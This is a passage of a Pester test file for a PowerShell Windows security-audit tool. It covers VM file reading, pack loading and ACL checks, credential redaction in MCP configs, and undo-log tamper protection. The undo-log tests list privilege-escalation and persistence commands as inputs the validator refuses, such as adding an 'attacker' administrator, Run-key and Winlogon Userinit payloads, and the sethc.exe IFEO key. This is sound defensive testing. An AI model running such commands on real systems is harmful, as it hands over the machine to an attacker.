                @($st.Notes) | Should -Be @($note) -Because "$k reports it"
                @($st.VmFileNotes) | Should -Be @($note)
                @($st.UnreadVmFiles).Count | Should -Be 0 -Because "$k skips it for its size, not for the user's rights"
                Set-TestDevice -Kind Secure
                $global:CETestVirt = $st
                Mock -ModuleName CEAudit Get-CEVirtualisationState { $global:CETestVirt }
                foreach ($id in 'FW-07', 'SC-12') {
                    $f = @(Invoke-CEAuditCore -Id $id)
                    $f[0].Status | Should -Be 'Info' -Because "$k $id reports the file rather than no virtual machines"
                    $f[0].Actual | Should -Match ([regex]::Escape($note))
                    $f[0].Recommendation | Should -Not -Match 'Invoke-CEUserProbe|per-user probe|elevated or SYSTEM audit|elevated prompt' -Because "$k $id"
                    $f[0].Recommendation | Should -Match 'can be read and is a VMware \.vmx \(up to 1 MB\)'
                }
            }
        }

        It 'reads at most maxVmFilesPerInventory VM files as SYSTEM or elevated, and says so' {
            $prof = Join-Path $TestDrive 'vm-cap-profile'
            $dir = Join-Path $prof 'VMs'
            New-Item -ItemType Directory -Force -Path $dir, (Join-Path $prof 'AppData\Roaming\VMware'), (Join-Path $prof '.VirtualBox') | Out-Null
            $lines = foreach ($i in 1..3) {
                $f = Join-Path $dir "vm$i.vmx"
                Set-Content -LiteralPath $f -Value "displayName = `"VM$i`""
                "vmlist$i.config = `"$f`""
            }
            Set-Content -LiteralPath (Join-Path $prof 'AppData\Roaming\VMware\inventory.vmls') -Value $lines
            $entries = foreach ($i in 1..3) {
                $f = Join-Path $dir "box$i.vbox"
                Set-Content -LiteralPath $f -Value "<VirtualBox xmlns=`"http://www.virtualbox.org/`"><Machine name=`"Box$i`"/></VirtualBox>"
                "<MachineEntry uuid=`"{$i}`" src=`"$f`"/>"
            }
            Set-Content -LiteralPath (Join-Path $prof '.VirtualBox\VirtualBox.xml') -Value "<VirtualBox xmlns=`"http://www.virtualbox.org/`"><Global><MachineRegistry>$($entries -join '')</MachineRegistry></Global></VirtualBox>"
            InModuleScope CEAudit -Parameters @{ P = $prof } {
                param($P)
                $orig = (Get-CEConfig)['virtualisation']
                try {
                    (Get-CEConfig)['virtualisation'] = [pscustomobject]@{ maxVmFilesPerInventory = 2 }
                    $notes = New-Object System.Collections.ArrayList
                    $vms = Get-CEVMwareMachine -ProfilePath $P -Notes $notes
                    @($vms | ForEach-Object { $_.Name }) | Should -Be @('VM1', 'VM2')
                    @($notes) | Should -Be @('The VMware inventory names more than 2 virtual machine files; an elevated or SYSTEM audit reads only the first 2 (maxVmFilesPerInventory in virtualisation.json), so the rest were not checked')
                    $vms = Get-CEVMwareMachine -ProfilePath $P -FollowLinks
                    @($vms).Count | Should -Be 3 -Because "the limit is for audits with more rights than the user"
                    $notes = New-Object System.Collections.ArrayList
                    $vbox = Get-CEVirtualBoxMachine -ProfilePath $P -Notes $notes
                    @($vbox | ForEach-Object { $_.Name }) | Should -Be @('Box1', 'Box2')
                    @($notes) | Should -Be @('The VirtualBox inventory names more than 2 virtual machine files; an elevated or SYSTEM audit reads only the first 2 (maxVmFilesPerInventory in virtualisation.json), so the rest were not checked')
                    $vbox = Get-CEVirtualBoxMachine -ProfilePath $P -FollowLinks
                    @($vbox).Count | Should -Be 3
                    (Get-CEConfig)['virtualisation'] = [pscustomobject]@{}
                    Get-CEVmFileCap | Should -Be 64
                }
                finally { (Get-CEConfig)['virtualisation'] = $orig }
            }
            (Get-Content (Join-Path $script:RepoRoot 'config\virtualisation.json') -Raw | ConvertFrom-Json).maxVmFilesPerInventory | Should -Be 64
        }

        It 'reports a VM file stored online only as found, not read, when elevated' {
            $prof = Join-Path $TestDrive 'vm-cloud-profile'
            $dir = Join-Path $prof 'VMs'
            New-Item -ItemType Directory -Force -Path $dir, (Join-Path $prof 'AppData\Roaming\VMware') | Out-Null
            $cloud = Join-Path $dir 'cloud.vmx'
            $local = Join-Path $dir 'local.vmx'
            Set-Content -LiteralPath $cloud -Value @('displayName = "Cloud"', 'ethernet0.present = "TRUE"', 'ethernet0.connectionType = "bridged"')
            Set-Content -LiteralPath $local -Value 'displayName = "Local"'
            Set-Content -LiteralPath (Join-Path $prof 'AppData\Roaming\VMware\inventory.vmls') -Value @("vmlist1.config = `"$cloud`"", "vmlist2.config = `"$local`"")
            InModuleScope CEAudit -Parameters @{ P = $prof; C = $cloud } {
                param($P, $C)
                $script:testVmProfile = $P
                Mock Get-CEUserProfilePath { $script:testVmProfile }
                Mock Get-CEWslDistribution { , @() }
                Mock Get-CEHyperVMachine { [pscustomobject]@{ Readable = $true; Message = ''; Machines = @(); NatMappings = @() } }
                Mock Get-CEContainer { , @() }
                Mock Get-CEVirtualisationListener { , @() }
                # The attributes of a file OneDrive keeps online only; a test can't make one.
                Mock Get-CEUserFileSkipReason { if ($Item.Name -eq 'cloud.vmx') { 'it is stored online only, and an elevated or SYSTEM audit does not download it' } else { '' } }
                $st = Get-CEVirtualisationStateUncached -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $true })
                @($st.VMware | ForEach-Object { $_.Name }) | Should -Be @('Local')
                @($st.Notes) | Should -Contain "VMware virtual machine file $C found, not read: it is stored online only, and an elevated or SYSTEM audit does not download it"
                @($st.UnreadVmFiles) | Should -Be @("VMware virtual machine file $C found, not read: it is stored online only, and an elevated or SYSTEM audit does not download it")
                # The user's own session reads it (their sync app downloads it for them, as it would anyway).
                $st = Get-CEVirtualisationStateUncached -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $false })
                @($st.VMware | ForEach-Object { $_.Name } | Sort-Object) | Should -Be @('Cloud', 'Local')
                @($st.Notes).Count | Should -Be 0
                @($st.UnreadVmFiles).Count | Should -Be 0
            }
        }

        It 'reads VM files through a cloud-synced folder, a reparse point that is not a link' {
            # With Known Folder Move, Documents\Virtual Machines is below a OneDrive folder, and every folder
            # there is a reparse point with a cloud tag. A test can't make one, so a junction stands in for
            # it, with Get-CEReparseTag giving its tag.
            $prof = Join-Path $TestDrive 'vm-cloudfolder-profile'
            $real = Join-Path $TestDrive 'vm-cloudfolder-real'
            New-Item -ItemType Directory -Force -Path $real, (Join-Path $prof 'AppData\Roaming\VMware'), (Join-Path $prof '.VirtualBox') | Out-Null
            Set-Content -LiteralPath (Join-Path $real 'lab.vmx') -Value 'displayName = "Lab"'
            Set-Content -LiteralPath (Join-Path $real 'Win.vbox') -Value '<VirtualBox xmlns="http://www.virtualbox.org/"><Machine name="Win"/></VirtualBox>'
            $cloud = Join-Path $prof 'Documents'
            New-Item -ItemType Junction -Path $cloud -Target $real | Out-Null
            Set-Content -LiteralPath (Join-Path $prof 'AppData\Roaming\VMware\inventory.vmls') -Value "vmlist1.config = `"$cloud\lab.vmx`""
            Set-Content -LiteralPath (Join-Path $prof '.VirtualBox\VirtualBox.xml') -Value "<VirtualBox xmlns=`"http://www.virtualbox.org/`"><Global><MachineRegistry><MachineEntry uuid=`"{1}`" src=`"$cloud\Win.vbox`"/></MachineRegistry></Global></VirtualBox>"
            try {
                InModuleScope CEAudit -Parameters @{ P = $prof } {
                    param($P)
                    $script:testTag = [Convert]::ToInt64('9000601A', 16)
                    Mock Get-CEReparseTag { $script:testTag }
                    $notes = New-Object System.Collections.ArrayList
                    $vms = Get-CEVMwareMachine -ProfilePath $P -Notes $notes
                    @($vms | ForEach-Object { $_.Name }) | Should -Be @('Lab')
                    $vbox = Get-CEVirtualBoxMachine -ProfilePath $P -Notes $notes
                    @($vbox | ForEach-Object { $_.Name }) | Should -Be @('Win')
                    @($notes).Count | Should -Be 0
                    # The same folder as a real junction is not followed.
                    $script:testTag = [Convert]::ToInt64('A0000003', 16)
                    $vms = Get-CEVMwareMachine -ProfilePath $P -Notes $notes
                    @($vms).Count | Should -Be 0
                    @($notes).Count | Should -Be 1
                }
            }
            finally { [IO.Directory]::Delete($cloud) }
        }

        It 'decides what is a link only in Test-CELinkItem' {
            # Any reparse point counting as a link dropped VM files and extensions in cloud-synced folders.
            # A file stored online only can't be made in a test, so this is the guard for Read-CEBoundedText.
            $problems = foreach ($file in Get-ChildItem (Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit') -Filter *.ps1 -Recurse) {
                $ast = [System.Management.Automation.Language.Parser]::ParseFile($file.FullName, [ref]$null, [ref]$null)
                foreach ($fn in $ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)) {
                    if ($fn.Name -ne 'Test-CELinkItem' -and $fn.Body.Extent.Text -match 'ReparsePoint') { "$($file.Name): $($fn.Name)" }
                }
            }
            @($problems) -join "`n" | Should -BeNullOrEmpty
        }
    }

    Context 'firmware catalog record validation' {
        It 'rejects records missing a version on any release, and SU-08 does not throw on odd records' {
            Set-TestDevice -Kind Secure
            InModuleScope CEAudit {
                $good = [pscustomobject]@{ schemaVersion = 1; vendor = 'dell'; id = '0CF1'; checkedAt = (Get-Date).ToUniversalTime().ToString('o'); releases = @([pscustomobject]@{ version = '1.0' }, [pscustomobject]@{ version = '1.1' }) }
                Test-CEFirmwareCatalogRecord $good 'dell' '0CF1' | Should -BeTrue
                $bad = [pscustomobject]@{ schemaVersion = 1; vendor = 'dell'; id = '0CF1'; checkedAt = (Get-Date).ToUniversalTime().ToString('o'); releases = @([pscustomobject]@{ version = '1.0' }, [pscustomobject]@{ date = '2026-01-01' }) }
                Test-CEFirmwareCatalogRecord $bad 'dell' '0CF1' | Should -BeFalse -Because 'the second release has no version'

                # A record that slips through with a missing name / date must not throw.
                $hw = [pscustomobject]@{ Manufacturer = 'Dell'; Model = 'X'; Firmware = [pscustomobject]@{ Version = '1.0' } }
                $rec = [pscustomobject]@{ schemaVersion = 1; vendor = 'dell'; id = '0CF1'; checkedAt = (Get-Date).ToUniversalTime().ToString('o'); releases = @([pscustomobject]@{ version = '9.9'; criticality = 'Urgent' }) }
                Mock Get-CEFirmwareCatalogRecord { [pscustomobject]@{ Status = 'Found'; Record = $rec; FromCache = $false; Message = ''; Key = $null } }
                $ev = New-Object System.Collections.ArrayList
                [void]$ev.Add('hardware evidence')  # SU-08 always adds hardware lines before calling
                { Get-CEFirmwareCatalogResult -Context (New-TestContext) -Hardware $hw -Evidence $ev } | Should -Not -Throw
            }
        }
    }

    Context 'strict-mode config reads survive partial overrides' {
        It 'NC-08 is Manual, not Error, when secure-boot.json is missing sections' {
            Set-TestDevice -Kind Secure
            InModuleScope CEAudit {
                $orig = (Get-CEConfig).'secure-boot'
                try {
                    (Get-CEConfig).'secure-boot' = [pscustomobject]@{ eventLookbackDays = 30 }  # no events, no certificates
                    $f = @(Invoke-CEAuditCore -Id 'NC-08')
                    @($f | Where-Object Status -eq 'Error').Count | Should -Be 0
                    ($f | Where-Object Subject -eq '').Status | Should -Be 'Manual'
                }
                finally { (Get-CEConfig).'secure-boot' = $orig }
            }
        }

        It 'SU-08 TPM advisories survive an advisory missing fields' {
            Set-TestDevice -Kind Secure
            InModuleScope CEAudit {
                $orig = (Get-CEConfig).'tpm-firmware-advisories'
                try {
                    (Get-CEConfig).'tpm-firmware-advisories' = [pscustomobject]@{ lastReviewed = '2026-01-01'; advisories = @([pscustomobject]@{ manufacturers = @('IFX'); affected = @([pscustomobject]@{ from = '1.0'; to = '9.0' }) }) }
                    { @(Invoke-CEAuditCore -Id 'SU-08') } | Should -Not -Throw
                }
                finally { (Get-CEConfig).'tpm-firmware-advisories' = $orig }
            }
        }
    }

    Context 'pack parent-directory ACL' {
        It 'rejects a ProgramData pack when only its parent folder is user-writable' {
            $data = Join-Path $TestDrive ([guid]::NewGuid().ToString('n'))
            New-Item -ItemType Directory -Force -Path (Join-Path $data 'packs\mypack') | Out-Null
            Set-Content -LiteralPath (Join-Path $data 'packs\mypack\pack.json') -Value '{ "id": "mypack", "name": "My pack", "version": "1.0.0" }'
            $env:CE_CHECKER_DATA = $data
            try {
                InModuleScope CEAudit -Parameters @{ Data = $data } {
                    param($Data)
                    $parent = Join-Path $Data 'packs'
                    # Only the parent folder is flagged as writable; the pack folder itself is clean.
                    Mock Get-CEPathAclProblem { if ($Path -eq $parent) { "$Path is writable by S-1-5-32-545" } else { @() } }
                    $pack = @(Get-CEPackCandidate | Where-Object { $_.Id -eq 'mypack' })
                    $pack.Count | Should -Be 1
                    $pack[0].Status | Should -Be 'Skipped'
                    $pack[0].Reason | Should -Match 'non-administrators could change it'
                    Should -Invoke Get-CEPathAclProblem -ParameterFilter { $Path -eq $parent } -Times 1 -Because 'the parent directory is checked'
                }
            }
            finally { Remove-Item Env:\CE_CHECKER_DATA -ErrorAction SilentlyContinue }
        }
    }

    Context 'data-path trust when elevated' {
        It 'trusts any path when not elevated or when CE_CHECKER_DATA is set' {
            InModuleScope CEAudit {
                Mock Test-CEIsAdmin { $false }
                Mock Get-CEPathAclProblem { @('writable by everyone') }
                Test-CEDataPathTrusted -Path 'C:\whatever' | Should -BeTrue -Because 'a non-elevated audit only affects its own user'
                Mock Test-CEIsAdmin { $true }
                $env:CE_CHECKER_DATA = 'C:\test-data'
                try { Test-CEDataPathTrusted -Path 'C:\whatever' | Should -BeTrue -Because 'the env override is a deliberate hook' }
                finally { Remove-Item Env:\CE_CHECKER_DATA -ErrorAction SilentlyContinue }
            }
        }

        It 'distrusts a writable default path when elevated' {
            InModuleScope CEAudit {
                Remove-Item Env:\CE_CHECKER_DATA -ErrorAction SilentlyContinue
                Mock Test-CEIsAdmin { $true }
                Mock Get-CEPathAclProblem { @('C:\ProgramData\... is writable by S-1-5-32-545') }
                Test-CEDataPathTrusted -Path 'C:\ProgramData\EngramicBaseline\config' | Should -BeFalse
                Mock Get-CEPathAclProblem { @() }
                Test-CEDataPathTrusted -Path 'C:\ProgramData\EngramicBaseline\config' | Should -BeTrue
            }
        }
    }
}

Describe 'Feature packs' {
    # Last in the file: these tests re-import the module with packs installed, then restore it.
    BeforeAll {
        $script:modulePath = Join-Path (Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit') 'CEAudit.psd1'
        function global:New-TestPack {
            param([string]$Root, [string]$Folder, $Manifest, [hashtable]$Files = @{})
            $dir = Join-Path $Root $Folder
            New-Item -ItemType Directory -Force -Path $dir | Out-Null
            if ($null -ne $Manifest) {
                $text = if ($Manifest -is [string]) { $Manifest } else { $Manifest | ConvertTo-Json -Depth 5 }
                Set-Content -LiteralPath (Join-Path $dir 'pack.json') -Value $text
            }
            foreach ($rel in $Files.Keys) {
                $target = Join-Path $dir $rel
                New-Item -ItemType Directory -Force -Path (Split-Path -Parent $target) | Out-Null
                Set-Content -LiteralPath $target -Value $Files[$rel]
            }
        }
        $rootA = Join-Path $TestDrive 'packs-a'
        $rootB = Join-Path $TestDrive 'packs-b'
        New-TestPack -Root $rootA -Folder 'good' -Manifest @{ id = 'good-pack'; name = 'Good pack'; version = '1.2.3'; minCoreVersion = '0.1.0'; categories = @(@{ id = 'GoodThings'; label = 'Good things' }) } -Files @{
            'Checks\01-Good.ps1' = @'
function Get-GoodPackAnswer { return (Get-CEConfig).'good-pack'.answer }
Register-CECheck -Id 'GP-01' -Category 'GoodThings' -Severity 'Low' -Title 'Good pack check' -Frameworks @('NCSC') -Reference 'Test.' -Test {
    param($ctx)
    New-CEResult -Status 'Pass' -Expected 'answer' -Actual "answer=$(Get-GoodPackAnswer)" -Remediation (New-CERemediationRef -Id 'GoodPack-Fix')
}
'@
            'Remediations\01-Good.ps1' = @'
Register-CERemediation -Id 'GoodPack-Fix' -Title 'Good pack fix' -Risk 'Low' -Apply { param($p, $undo) }
'@
            'config\good-pack.json' = '{ "answer": 42 }'
        }
        New-TestPack -Root $rootA -Folder 'no-manifest' -Manifest $null
        New-TestPack -Root $rootA -Folder 'bad-json' -Manifest '{ not json'
        New-TestPack -Root $rootA -Folder 'bad-id' -Manifest @{ id = 'Bad Id!'; name = 'x'; version = '1.0.0' }
        New-TestPack -Root $rootA -Folder 'too-new' -Manifest @{ id = 'too-new'; name = 'x'; version = '1.0.0'; minCoreVersion = '99.0.0' }
        New-TestPack -Root $rootA -Folder 'config-clash' -Manifest @{ id = 'config-clash'; name = 'x'; version = '1.0.0' } -Files @{ 'config\thresholds.json' = '{}' }
        New-TestPack -Root $rootA -Folder 'throws' -Manifest @{ id = 'throws'; name = 'x'; version = '1.0.0'; categories = @(@{ id = 'HalfDone'; label = 'Half done' }) } -Files @{
            'Checks\01.ps1' = @'
Register-CECheck -Id 'TH-01' -Category 'HalfDone' -Severity 'Low' -Title 't' -Frameworks @('NCSC') -Reference 't' -Test { }
throw 'boom'
'@
        }
        New-TestPack -Root $rootA -Folder 'duplicate-check' -Manifest @{ id = 'duplicate-check'; name = 'x'; version = '1.0.0' } -Files @{
            'Checks\01.ps1' = "Register-CECheck -Id 'FW-01' -Category 'Firewalls' -Severity 'Low' -Title 't' -Frameworks @('NCSC') -Reference 't' -Test { }"
        }
        New-TestPack -Root $rootA -Folder 'hijack' -Manifest @{ id = 'hijack'; name = 'x'; version = '1.0.0' } -Files @{
            'Checks\01.ps1' = "function Get-CEConfig { @{ hijacked = `$true } }"
        }
        New-TestPack -Root $rootB -Folder 'good-again' -Manifest @{ id = 'good-pack'; name = 'Good pack copy'; version = '9.9.9' }

        $script:savedPacksEnv = $env:CE_CHECKER_PACKS
        $env:CE_CHECKER_PACKS = $rootA + [IO.Path]::PathSeparator + $rootB
        # 3>&1: warnings raised while the module loads aren't caught by -WarningVariable.
        $script:packWarnings = @(Import-Module $script:modulePath -Force 3>&1)
        Set-TestTripwires
        $script:packs = @{}
        foreach ($p in @(Get-CEPack)) { $script:packs[(Split-Path -Leaf $p.Path)] = $p }
    }
    AfterAll {
        $env:CE_CHECKER_PACKS = $script:savedPacksEnv
        Remove-Item Env:\CE_CHECKER_DATA -ErrorAction SilentlyContinue
        Import-Module $script:modulePath -Force
        Set-TestTripwires
    }

    It 'loads a valid pack: category, check, remediation, helper functions and config' {
        $good = $script:packs['good']
        $good.Status | Should -Be 'Loaded'
        $good.Version | Should -Be '1.2.3'
        $good.Checks | Should -Be @('GP-01')
        $good.Remediations | Should -Be @('GoodPack-Fix')
        (Get-CECategory | Where-Object Id -eq 'GoodThings').Label | Should -Be 'Good things'
        (Get-CECategory | Where-Object Id -eq 'GoodThings').Pack | Should -Be 'good-pack'
        (Get-CECheck -Id 'GP-01').Pack | Should -Be 'good-pack'
        (Get-CECheck -Id 'FW-01').Pack | Should -BeNullOrEmpty
        InModuleScope CEAudit { Mock Get-CEDeviceContext { New-TestContext } }
        $f = @(Invoke-CEAuditCore -Id 'GP-01')
        $f[0].Status | Should -Be 'Pass'
        $f[0].Actual | Should -Be 'answer=42' -Because "the pack's helper function and config are available when its check runs"
        $f[0].Pack | Should -Be 'good-pack'
        $f[0].Category | Should -Be 'GoodThings'
    }

    It 'skips invalid packs with a reason, without affecting the core' {
        $script:packs['no-manifest'].Reason | Should -Be 'No pack.json'
        $script:packs['bad-json'].Reason | Should -Match 'not valid JSON'
        $script:packs['bad-id'].Reason | Should -Match 'Invalid pack id'
        $script:packs['too-new'].Reason | Should -Match 'Needs Engramic Baseline 99\.0\.0 or later'
        $script:packs['config-clash'].Reason | Should -Match 'Config file name already used: thresholds\.json'
        $script:packs['good-again'].Reason | Should -Match "Pack 'good-pack' is already loaded"
        @(Get-CEPack | Where-Object Status -eq 'Loaded').Count | Should -Be 1
        @(Get-CECheck | Where-Object { -not $_.Pack }).Count | Should -Be 58
    }

    It 'rolls back everything a pack registered when it fails part way' {
        $script:packs['throws'].Status | Should -Be 'Skipped'
        $script:packs['throws'].Reason | Should -Match 'Failed to load: boom'
        @(Get-CECheck -Id 'TH-01').Count | Should -Be 0
        @(Get-CECategory).Id | Should -Not -Contain 'HalfDone'
        $script:packs['duplicate-check'].Reason | Should -Match 'Duplicate check id FW-01'
        @(Get-CECheck -Id 'FW-01').Count | Should -Be 1
        @($script:packWarnings | ForEach-Object { "$_" }) -join "`n" | Should -Match "pack 'throws' was not loaded"
    }

    It 'refuses a pack that replaces a built-in function, and puts the original back' {
        $script:packs['hijack'].Reason | Should -Match 'redefines the built-in function Get-CEConfig'
        (Get-CEConfig -Force).PSObject.Properties.Name | Should -Not -Contain 'hijacked'
        (Get-CEConfig).thresholds.patchWindowDays | Should -Be 14
    }

    It 'lets an administrator override pack config from the data folder' {
        $data = Join-Path $TestDrive 'data-override'
        New-Item -ItemType Directory -Force -Path (Join-Path $data 'config') | Out-Null
        Set-Content -LiteralPath (Join-Path (Join-Path $data 'config') 'good-pack.json') -Value '{ "answer": 7 }'
        $env:CE_CHECKER_DATA = $data
        try { (Get-CEConfig -Force).'good-pack'.answer | Should -Be 7 }
        finally { Remove-Item Env:\CE_CHECKER_DATA; Get-CEConfig -Force | Out-Null }
        (Get-CEConfig).'good-pack'.answer | Should -Be 42
    }

    It 'lists packs in status.json and the reports' {
        InModuleScope CEAudit { Mock Get-CEDeviceContext { New-TestContext } }
        $f = @(Invoke-CEAuditCore -Id 'GP-01')
        $ctx = New-TestContext
        $r = Export-CEReport -Findings $f -Context $ctx -OutputPath (Join-Path $TestDrive 'pack-report')
        (Get-Content $r.Paths.Markdown -Raw) | Should -Match ([regex]::Escape('- **Packs:** Good pack 1.2.3'))
        (Get-Content $r.Paths.Html -Raw) | Should -Match 'Packs: Good pack 1\.2\.3'
        (Get-Content $r.Paths.Markdown -Raw) | Should -Match '### Good things'
        $status = ConvertTo-CEStatus -Findings $f -Summary $r.Summary -Context $ctx
        @($status.Packs | Where-Object { $_.Id -eq 'good-pack' -and $_.Status -eq 'Loaded' }).Count | Should -Be 1
        @($status.Packs | Where-Object { $_.Id -eq 'good-pack' -and $_.Status -eq 'Skipped' }).Count | Should -Be 1 -Because 'the duplicate copy is reported too'
        ($status.Packs | Where-Object { $_.Id -eq 'hijack' }).Status | Should -Be 'Skipped'
    }

    It 'checks pack permissions: only administrators, SYSTEM and TrustedInstaller may own or change them' {
        InModuleScope CEAudit {
            $rule = { param($sid, $rights, $type = 'Allow') [pscustomobject]@{ IdentityReference = $sid; FileSystemRights = [long]$rights; AccessControlType = $type } }
            $admins = 'S-1-5-32-544'; $users = 'S-1-5-32-545'; $user = 'S-1-5-21-1-2-3-1001'
            @(Test-CEAdminOnlyAcl -Owner $admins -Rules @((& $rule 'S-1-5-18' 2032127), (& $rule $admins 2032127), (& $rule $users 1179817))).Count | Should -Be 0 -Because 'users may read and execute'
            @(Test-CEAdminOnlyAcl -Owner $user -Rules @()) | Should -Match 'owned by S-1-5-21-1-2-3-1001'
            @(Test-CEAdminOnlyAcl -Owner $admins -Rules @(& $rule $users 1180063)) | Should -Match 'writable by S-1-5-32-545' -Because 'Modify includes write'
            @(Test-CEAdminOnlyAcl -Owner $admins -Rules @(& $rule $user 0x10000000)) | Should -Match 'writable' -Because 'GENERIC_ALL on inherit-only entries'
            @(Test-CEAdminOnlyAcl -Owner $admins -Rules @(& $rule 'S-1-3-0' 2032127)).Count | Should -Be 0 -Because 'CREATOR OWNER only affects new items'
            @(Test-CEAdminOnlyAcl -Owner $admins -Rules @(& $rule $users 2032127 'Deny')).Count | Should -Be 0
        }
    }

    It 'refuses a pack in the data folder that a standard user could change' -Skip:(-not ($PSVersionTable.PSVersion.Major -lt 6 -or $IsWindows)) {
        $data = Join-Path $TestDrive 'data-packs'
        New-TestPack -Root (Join-Path $data 'packs') -Folder 'user-owned' -Manifest @{ id = 'user-owned'; name = 'x'; version = '1.0.0' }
        $env:CE_CHECKER_DATA = $data
        $env:CE_CHECKER_PACKS = $null
        try {
            Import-Module $script:modulePath -Force -WarningAction SilentlyContinue
            $p = Get-CEPack | Where-Object Id -eq 'user-owned'
            $p.Status | Should -Be 'Skipped'
            $p.Reason | Should -Match 'Not loaded because non-administrators could change it'
        }
        finally {
            Remove-Item Env:\CE_CHECKER_DATA -ErrorAction SilentlyContinue
            $env:CE_CHECKER_PACKS = $rootA + [IO.Path]::PathSeparator + $rootB
        }
    }
}

Describe 'MCP inventory never records a credential value' {
    # The AI tab and the docs both promise that only where and how a credential is stored is
    # recorded. The classifier honoured that; the two descriptive fields beside it did not.
    It 'redacts a token passed as a server argument' {
        InModuleScope CEAudit {
            $secret = 'sk-ant-api03-LEAKCANARY000000000000000000000000'
            $cfg = ConvertFrom-CEJsonc -Text ('{ "mcpServers": { "s": { "command": "npx", "args": ["-y", "@scope/server", "' + $secret + '"] } } }')
            $recs = @(ConvertTo-CEMcpServers -Config $cfg -Root 'mcpServers' -ToolId 't' -RelPath 'x' -AclIssue '' -Patterns (Get-CECredentialPatterns))
            ($recs | ConvertTo-Json -Depth 6) | Should -Not -Match 'LEAKCANARY'
            $recs[0].argsSummary | Should -Match '@scope/server'
        }
    }

    It 'keeps only scheme, host and port from a url, dropping userinfo and path' {
        InModuleScope CEAudit {
            $patterns = Get-CECredentialPatterns
            $cases = @(
                @{ Url = 'https://user:LEAKCANARY@mcp.example.com/sse'; Expect = 'https://mcp.example.com/...' },
                @{ Url = 'https://mcp.example.com/LEAKCANARY/sse';      Expect = 'https://mcp.example.com/...' },
                @{ Url = 'https://mcp.example.com:8443/';               Expect = 'https://mcp.example.com:8443' },
                @{ Url = 'https://mcp.example.com/?token=LEAKCANARY';   Expect = 'https://mcp.example.com' }
            )
            foreach ($c in $cases) {
                $cfg = ConvertFrom-CEJsonc -Text ('{ "mcpServers": { "s": { "url": "' + $c.Url + '" } } }')
                $recs = @(ConvertTo-CEMcpServers -Config $cfg -Root 'mcpServers' -ToolId 't' -RelPath 'x' -AclIssue '' -Patterns $patterns)
                ($recs | ConvertTo-Json -Depth 6) | Should -Not -Match 'LEAKCANARY' -Because $c.Url
                $recs[0].endpoint | Should -Be $c.Expect -Because $c.Url
            }
        }
    }

    It 'redacts a bare high-entropy argument the pattern list does not recognise' {
        InModuleScope CEAudit {
            $cfg = ConvertFrom-CEJsonc -Text '{ "mcpServers": { "s": { "command": "run", "args": ["QWERTYUIOPASDFGHJKLZXCVBNM123456"] } } }'
            $recs = @(ConvertTo-CEMcpServers -Config $cfg -Root 'mcpServers' -ToolId 't' -RelPath 'x' -AclIssue '' -Patterns (Get-CECredentialPatterns))
            $recs[0].argsSummary | Should -Be '(redacted)'
        }
    }
}

Describe 'Undo log cannot be used to escalate privilege' {
    # A tampered undo log is the one input a rollback trusts, and a rollback often runs elevated.
    # Naming an allow-listed command was once enough; these are the shapes that got through.
    It 'refuses a registry record outside the keys the tool writes' {
        InModuleScope CEAudit {
            $bad = @(
                'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
                'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                'HKLM:\SYSTEM\CurrentControlSet\Services\Foo',
                'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe',
                'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\..\..\..\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                'HKLM:\SOFTWARE\Policies\*'
            )
            foreach ($p in $bad) { Test-CEUndoRegistryPathAllowed $p | Should -Not -BeNullOrEmpty -Because $p }
        }
    }

    It 'still allows every key the shipped remediations write' {
        InModuleScope CEAudit {
            $ok = @(
                'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa',
                'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp',
                'HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces\{1234}',
                'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection',
                'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit',
                'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU',
                'HKCU:\Software\Policies\Microsoft\Office\16.0\Word\Security'
            )
            foreach ($p in $ok) { Test-CEUndoRegistryPathAllowed $p | Should -BeNullOrEmpty -Because $p }
        }
    }

    It 'refuses an allow-listed command whose arguments would hand over the machine' {
        InModuleScope CEAudit {
            $bad = @(
                'net localgroup administrators attacker /add',
                'net.exe localgroup administrators attacker /add',
                'net.exe user attacker P@ssw0rd! /add',
                'net.exe user administrator /active:yes',
                "Set-Service -Name 'Foo' -BinaryPathName 'C:\payload.exe'",
                "Set-ItemProperty -LiteralPath 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name x -Value 'payload'",
                "Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Foo' -Name ImagePath -Value 'payload'",
                "Write-Warning 'x' > C:\Windows\System32\payload.ps1"
            )
            foreach ($c in $bad) { Test-CEUndoCommandAllowed $c | Should -Not -BeNullOrEmpty -Because $c }
        }
    }

    It 'skips a tampered registry record instead of writing it, and keeps going' {
        InModuleScope CEAudit {
            Mock New-ItemProperty { }
            Mock New-Item { }
            Mock Test-CEIsAdmin { $false }
            $log = Join-Path $TestDrive 'undo-tampered.json'
            [pscustomobject]@{
                ComputerName = $env:COMPUTERNAME
                Items        = @([pscustomobject]@{
                        ItemId = 'C001'
                        Undo   = @([pscustomobject]@{
                                Type = 'Registry'; Existed = $true; Kind = 'ExpandString'
                                Path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
                                Name = 'Userinit'; Value = 'C:\payload.exe'
                            })
                    })
            } | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $log -Encoding UTF8

            $warnings = @()
            Restore-CEUndoLog -Path $log -Confirm:$false -WarningVariable warnings -WarningAction SilentlyContinue
            Should -Invoke New-ItemProperty -Times 0
            ($warnings -join ' ') | Should -Match 'Refusing to restore'
        }
    }
}

Describe 'Undo command safety (Test-CEUndoCommandAllowed)' {
    It 'allows the commands remediations actually generate' {
        InModuleScope CEAudit {
            $ok = @(
                "Set-NetFirewallProfile -Name 'Domain' -Enabled 'True'",
